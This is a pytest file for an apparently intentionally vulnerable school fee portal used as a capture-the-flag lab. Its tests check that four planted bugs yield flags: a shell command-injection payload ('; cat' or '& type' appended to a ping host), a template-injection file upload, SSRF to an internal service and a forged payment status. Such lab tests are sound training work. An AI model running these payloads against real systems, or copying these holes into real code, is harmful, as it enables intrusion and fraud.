import os
import sqlite3
import subprocess
import sys
import threading
from pathlib import Path

import pytest
from werkzeug.serving import make_server

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "services" / "grading"))

from portal import create_app  # noqa: E402


@pytest.fixture(scope="module")
def app(tmp_path_factory):
    home = tmp_path_factory.mktemp("mfano4")
    env = dict(os.environ, MFANO_HOME=str(home))
    subprocess.run([sys.executable, "seed.py"], cwd=ROOT, env=env, check=True, capture_output=True)
    os.environ["MFANO_HOME"] = str(home)
    return create_app({"TESTING": True})


@pytest.fixture(scope="module")
def grading_server():
    import app as grading  # the internal grading service

    server = make_server("127.0.0.1", 0, grading.app)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{server.server_port}"
    server.shutdown()


def login(client, username="admin", password="Mfano@Admin2026"):
    return client.post("/login", data={"username": username, "password": password}, follow_redirects=True)


def test_command_injection_reads_planted_flag(app):
    client = app.test_client()
    login(client)
    flag_path = Path(app.config["MFANO_HOME"]) / "server.flag"
    # On the Linux lab box this payload is "127.0.0.1; cat /srv/mfano/server.flag".
    # The test host is Windows, so the same bug is reached with "&" and "type".
    if os.name == "nt":
        payload = f'127.0.0.1 & type "{flag_path}"'
    else:
        payload = f"127.0.0.1; cat '{flag_path}'"
    body = client.post("/admin/tools/ping", data={"host": payload}).data
    assert b"MFANO{s3m1c0l0n_r34ch3d_th3_sh3ll}" in body


def test_upload_accepts_any_file_and_executes_it(app):
    import io

    client = app.test_client()
    login(client)
    # No type check: a template payload is accepted and then runs server-side.
    data = {"file": (io.BytesIO(b"{{ config['SERVER_FLAG'] }}"), "evil.html")}
    client.post("/admin/tools/upload", data=data, content_type="multipart/form-data")
    body = client.get("/admin/tools/preview", query_string={"name": "evil.html"}).data
    assert b"MFANO{upl04d3d_scr1pt_r4n_0n_th3_s3rv3r}" in body


def test_ssrf_reaches_internal_grading_service(app, grading_server):
    client = app.test_client()
    login(client)
    target = grading_server + "/internal/logo-config"
    body = client.post("/admin/tools/import-logo", data={"url": target}).data
    assert b"MFANO{ssrf_r34ch3d_th3_gr4d1ng_s3rv1c3}" in body


def test_payment_tamper_clears_balance_without_paying(app):
    client = app.test_client()
    login(client, "MHS1021", "Student@123")
    conn = sqlite3.connect(app.config["DATABASE"])
    balance = conn.execute("SELECT fee_balance FROM students WHERE admission='MHS1021'").fetchone()[0]
    conn.close()

    resp = client.post("/payments/pay", data={"amount": balance, "status": "COMPLETED"})
    body = resp.get_json()
    assert body["balance"] == 0
    assert body["flag"] == "MFANO{p41d_n0th1ng_f33s_cl34r3d}"
